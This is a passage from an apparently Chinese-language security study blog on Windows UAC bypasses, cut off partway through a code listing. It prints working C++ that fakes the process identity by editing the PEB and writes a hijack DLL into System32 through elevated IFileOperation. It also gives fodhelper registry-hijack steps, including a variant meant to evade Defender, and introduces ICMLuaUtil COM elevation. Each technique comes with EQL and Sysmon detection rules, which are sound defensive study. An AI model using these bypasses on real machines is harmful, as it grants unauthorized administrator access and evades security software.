class="line">LPLDRENUMERATELOADEDMODULESLdrEnumerateLoadedModules;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> NTSTATUS NTAPI <span class="title function_">NTALLOCATEVIRTUALMEMORY</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_        HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">    _Inout_     PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">    _In_        ULONG_PTR ZeroBits,</span></span><br><span class="line"><span class="params">    _Inout_     PSIZE_T RegionSize,</span></span><br><span class="line"><span class="params">    _In_        ULONG AllocationType,</span></span><br><span class="line"><span class="params">    _In_        ULONG Protect</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="keyword">typedef</span> NTALLOCATEVIRTUALMEMORY FAR* LPNTALLOCATEVIRTUALMEMORY;</span><br><span class="line">LPNTALLOCATEVIRTUALMEMORYNtAllocateVirtualMemory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LPWSTR g_lpszRundll = <span class="string">L&quot;C:\\windows\\system32\\rundll32.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">VOID NTAPI <span class="title function_">supxLdrEnumModulesCallback</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,</span></span><br><span class="line"><span class="params">    _In_ PVOID Context,</span></span><br><span class="line"><span class="params">    _Inout_ BOOLEAN* StopEnumeration</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    PPEB Peb = (PPEB)Context;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (DataTableEntry-&gt;DllBase == Peb-&gt;ImageBaseAddress) &#123;</span><br><span class="line">        RtlInitUnicodeString(&amp;DataTableEntry-&gt;FullDllName, g_lpszRundll);</span><br><span class="line">        RtlInitUnicodeString(&amp;DataTableEntry-&gt;BaseDllName, <span class="string">L&quot;rundll32.exe&quot;</span>);</span><br><span class="line">        *StopEnumeration = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        *StopEnumeration = FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__inline <span class="keyword">struct</span> _PEB* <span class="title function_">NtCurrentPeb</span><span class="params">()</span> &#123; <span class="keyword">return</span> NtCurrentTeb()-&gt;ProcessEnvironmentBlock; &#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">supMasqueradeProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">    VOID</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    PPEB    Peb = NtCurrentPeb();</span><br><span class="line">    SIZE_T  RegionSize;</span><br><span class="line"></span><br><span class="line">    PVOID g_lpszExplorer = <span class="literal">NULL</span>;</span><br><span class="line">    RegionSize = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    Status = NtAllocateVirtualMemory(</span><br><span class="line">        NtCurrentProcess(),</span><br><span class="line">        &amp;g_lpszExplorer,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;RegionSize,</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NT_SUCCESS(Status)) &#123;</span><br><span class="line">        RtlEnterCriticalSection(Peb-&gt;FastPebLock);</span><br><span class="line"></span><br><span class="line">        RtlInitUnicodeString(&amp;Peb-&gt;ProcessParameters-&gt;ImagePathName, g_lpszRundll);</span><br><span class="line">        RtlInitUnicodeString(&amp;Peb-&gt;ProcessParameters-&gt;CommandLine, g_lpszRundll);</span><br><span class="line"></span><br><span class="line">        RtlLeaveCriticalSection(Peb-&gt;FastPebLock);</span><br><span class="line"></span><br><span class="line">        LdrEnumerateLoadedModules(<span class="number">0</span>, &amp;supxLdrEnumModulesCallback, (PVOID)Peb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, CHAR* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hinstStub = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hinstStub)</span><br><span class="line">    &#123;</span><br><span class="line">        RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(hinstStub, <span class="string">&quot;RtlInitUnicodeString&quot;</span>);</span><br><span class="line">        RtlEnterCriticalSection = (LPRTLENTERCRITICALSECTION)GetProcAddress(hinstStub, <span class="string">&quot;RtlEnterCriticalSection&quot;</span>);</span><br><span class="line">        RtlLeaveCriticalSection = (LPRTLLEAVECRITICALSECTION)GetProcAddress(hinstStub, <span class="string">&quot;RtlLeaveCriticalSection&quot;</span>);</span><br><span class="line">        LdrEnumerateLoadedModules = (LPLDRENUMERATELOADEDMODULES)GetProcAddress(hinstStub, <span class="string">&quot;LdrEnumerateLoadedModules&quot;</span>);</span><br><span class="line"></span><br><span class="line">        NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(hinstStub, <span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!NtAllocateVirtualMemory || !RtlInitUnicodeString || !RtlEnterCriticalSection || !RtlLeaveCriticalSection || !LdrEnumerateLoadedModules )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Could not find ... in NTDLL.DLL&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Could not GetModuleHandle of NTDLL.DLL&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    supMasqueradeProcess();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin move dll by IFileOperation&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    HMODULE hModule = <span class="literal">NULL</span>;</span><br><span class="line">    IFileOperation* fileOperation = <span class="literal">NULL</span>;</span><br><span class="line">    LPCWSTR DFileName = <span class="string">L&quot;dismcore.dll&quot;</span>;</span><br><span class="line">    LPCWSTR SourceFullPath = <span class="string">L&quot;C:\\ProgramData\\dismcore.dll&quot;</span>;</span><br><span class="line">    LPCWSTR DestPath = <span class="string">L&quot;C:\\windows\\System32&quot;</span>;</span><br><span class="line">    HRESULT hr = CoInitializeEx(<span class="literal">NULL</span>, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);</span><br><span class="line">    <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line"></span><br><span class="line">        hr = CoCreateInstance(CLSID_FileOperation, <span class="literal">NULL</span>, CLSCTX_ALL, IID_PPV_ARGS(&amp;fileOperation));</span><br><span class="line">        <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">            DWORD flags = <span class="number">0</span>;</span><br><span class="line">            PPEB pPeb = NtCurrentPeb();  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] Detected OS Build Number: %d\n&quot;</span>, pPeb-&gt;OSBuildNumber);</span><br><span class="line">            <span class="keyword">if</span> (pPeb-&gt;OSBuildNumber &gt; <span class="number">14997</span>) &#123;</span><br><span class="line">                flags = FOF_NOCONFIRMATION | </span><br><span class="line">                        FOFX_NOCOPYHOOKS | </span><br><span class="line">                        FOFX_REQUIREELEVATION;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                flags = FOF_NOCONFIRMATION | </span><br><span class="line">                        FOF_SILENT | </span><br><span class="line">                        FOFX_SHOWELEVATIONPROMPT | </span><br><span class="line">                        FOFX_NOCOPYHOOKS | </span><br><span class="line">                        FOFX_REQUIREELEVATION |</span><br><span class="line">                        FOF_NOERRORUI;</span><br><span class="line">            &#125;</span><br><span class="line">            hr = fileOperation-&gt;SetOperationFlags(flags);</span><br><span class="line">            <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">                IShellItem* from = <span class="literal">NULL</span>, * to = <span class="literal">NULL</span>;</span><br><span class="line">                hr = SHCreateItemFromParsingName(SourceFullPath, <span class="literal">NULL</span>, IID_PPV_ARGS(&amp;from));</span><br><span class="line">                <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (DestPath)</span><br><span class="line">                        hr = SHCreateItemFromParsingName(DestPath, <span class="literal">NULL</span>, IID_PPV_ARGS(&amp;to));</span><br><span class="line">                    <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">                        hr = fileOperation-&gt;CopyItem(from, to, DFileName, <span class="literal">NULL</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="literal">NULL</span> != to)</span><br><span class="line">                            to-&gt;Release();</span><br><span class="line">                    &#125;</span><br><span class="line">                    from-&gt;Release();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">                    hr = fileOperation-&gt;PerformOperations();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            fileOperation-&gt;Release();</span><br><span class="line">        &#125;</span><br><span class="line">        CoUninitialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin run pkgmgr.exe&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ShellExecuteA(<span class="literal">NULL</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;pkgmgr.exe&quot;</span>, <span class="string">&quot;/iu:TelnetClient&quot;</span>, <span class="literal">NULL</span>, SW_SHOWNORMAL))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute failed (%d)&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在windows 10 19044成功实现 <code>IFileOperation</code>往高权限目录system32写dll文件。</p><p><img src="/image/2025-12-30-learning_windows_4/1770623080528.png" alt="1770623080528"></p><h6 id="EQL基本语法"><a href="#EQL基本语法" class="headerlink" title="EQL基本语法"></a>EQL基本语法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sequence with maxspan=5s</span><br><span class="line">  [事件1]</span><br><span class="line">  [事件2]</span><br><span class="line">  [事件3]</span><br></pre></td></tr></table></figure><p>sequence ：告诉引擎这些事件必须按时间顺序发生（1 -&gt; 2 -&gt; 3）。</p><p>maxspan&#x3D;5s ： 最大时间跨度 。表示从“事件1”开始到“事件3”结束，整个过程不能超过 5 秒。</p><p>[any where …]</p><p>any ：表示匹配任意类型的事件</p><p>where ：后面跟具体的过滤条件。</p><p>字段名 ：</p><ul><li>winlog.event_id：事件 ID（1&#x3D;进程创建, 7&#x3D;镜像加载，11&#x3D;文件创建）。</li><li>winlog.event_data.Image：进程路径。</li><li>winlog.event_data.TargetFilename：目标文件。</li><li>winlog.event_data.ParentImage：父进程。</li><li>regex ：正则表达式匹配。<ul><li>例：<code>regex &quot;.DllHost</code>(正则匹配中<code>.</code>需要反斜杠来转义)</li><li>注意 ：EQL 中反斜杠 <code>\</code> 需要转义，所以写路径时要用 ``。</li></ul></li><li>stringContains （或者直接用<code>:</code>）：包含字符串。</li></ul><h6 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h6><p>该提权过程必然发生两件事</p><ul><li>文件创建 ：通过IFileOperation越权写dismcore.dll到sysmon32下</li><li>进程创建：恶意程序会启动pkgmgr.exe，pkgmgr.exe启动dism.exe，dism.exe加载一个位于system32下的dismcore.dll</li></ul><p>其他博主给出的检测规则如下，虽然最大时间时间跨度存在问题，因为只要写入dll后续任何时间都可以进行劫持，但是在进行实验时发现windows defender会延时删除往system32里写入的dll，因此恶意软件若想立刻避开只能抢在删除前立刻执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sequence with maxspan=5s</span><br><span class="line">      [any where winlog.event_id==11 and winlog.event_data.Image regex &quot;.*DllHost\\.exe.*&quot; and winlog.event_data.TargetFilename regex &quot;.*dismcore\\.dll&quot;]</span><br><span class="line">      [any where winlog.event_id==1 and winlog.event_data.Image regex &quot;.*PkgMgr\\.exe.*&quot;]  </span><br><span class="line">      [any where winlog.event_id==1 and winlog.event_data.Image regex &quot;.*Dism\\.exe&quot; and winlog.event_data.ParentImage regex &quot;.*PkgMgr\\.exe&quot;]</span><br></pre></td></tr></table></figure><p>博主写了个规则用于检测是否有进程向 <code>System32</code> 根目录写入了那 5 个不该出现在那里的 DLL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">any where winlog.event_id == 11 and </span><br><span class="line">winlog.event_data.TargetFilename regex &quot;.*\\\\System32\\\\[^\\\\]+\\.dll&quot; and</span><br><span class="line">winlog.event_data.TargetFilename regex &quot;.*(dismcore|folderprovider|dismprov|logprovider|dismcoreps)\\.dll&quot;</span><br></pre></td></tr></table></figure><p><img src="/image/2026-02-08-learning_windows_6/1770637949454.png" alt="1770637949454"></p><h5 id="通过注册表篡改pe执行逻辑"><a href="#通过注册表篡改pe执行逻辑" class="headerlink" title="通过注册表篡改pe执行逻辑"></a>通过注册表篡改pe执行逻辑</h5><h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p>利用 <code>fodhelper.exe</code>（Windows“按需功能”助手）。该程序位于可信目录（System32）下，且 Manifest 中包含 <code>&lt;autoElevate&gt;true&lt;/autoElevate&gt;</code>，因此它可以不弹窗自动提权运行。</p><p><code>fodhelper.exe</code> 在运行时会查询当前用户注册表（HKCU）下的特定键值来决定如何启动子进程。可以通过修改这些键值，让 <code>fodhelper.exe</code>以管理员权限启动恶意程序。</p><ul><li>在 <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code> 下创建键值。</li><li>新建一个名为 <code>DelegateExecute</code> 的键，值设为空（这会迫使程序去读取默认键值）。</li><li>修改 <code>(Default)</code>键的值为恶意程序路径（例如 <code>C:\windows\system32\cmd.exe</code>）。</li><li>运行 <code>fodhelper.exe</code>。它会读取上述注册表，进而以高权限启动 <code>cmd.exe</code>。</li></ul><p>Windows Defender 会监控 <code>ms-settings</code> 键值的修改并查杀进程。可以利用一个变种思路：</p><ul><li><code>fodhelper.exe</code> 还会查询 <code>HKCU\Software\Classes\ms-settings\CurVer</code>。</li><li>修改 <code>CurVer</code> 的值指向一个自定义名称（如 <code>.pwn</code>），然后将 Payload 写入到这个自定义名称的注册表路径下（如 <code>HKCU\Software\Classes\.pwn\Shell\Open\command</code>）。</li><li>试图通过重定向注册表查询路径，绕过杀软对标准路径 <code>ms-settings</code>的静态监控（目前依然会杀）。</li></ul><h6 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h6><p>监控 <code>HKCU\Software\Classes\ms-settings\Shell\Open\command\(default)</code> 的修改。</p><p>监控 <code>HKCU\Software\Classes\ms-settings\CurVer\(default)</code> 的修改。</p><p>将下面的规则添加到sysmon配置文件的 <code>&lt;EventFiltering&gt;</code>中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Sysmon</span> <span class="attr">schemaversion</span>=<span class="string">&quot;4.82&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RuleGroup</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">groupRelation</span>=<span class="string">&quot;or&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">RegistryEvent</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\Shell\Open\command<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\CurVer<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RegistryEvent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RuleGroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">RuleGroup</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">groupRelation</span>=<span class="string">&quot;or&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">RegistryValueSet</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\Shell\Open\command\(Default)<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>\Software\Classes\ms-settings\CurVer\(Default)<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">RegistryValueSet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RuleGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Sysmon</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="com组件ICMLuaUtil提权"><a href="#com组件ICMLuaUtil提权" class="headerlink" title="com组件ICMLuaUtil提权"></a>com组件ICMLuaUtil提权</h5><h6 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h6><p><code>CMSTPLUA</code> 是一个未文档化的 COM 组件（CLSID: <code>{3E5FC7F9-9A51-4367-9063-A120244FBEC7}</code>），通常用于应用程序兼容性管理。该组件实现了 <code>ICMLuaUtil</code> 接口，其中包含一个 <code>ShellExec</code> 方法。这个方法允许执行外部程序。如果我们可以使用高权限ICMLuaUtil组件接口调用ShellExec运行特定的程序，那么我们就能获得管理员权限。</p><p>可以远程dll注入到微软定义的合法进程explorer.exe等，或者通过修改PEB进行进程伪装。</p><p>代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span 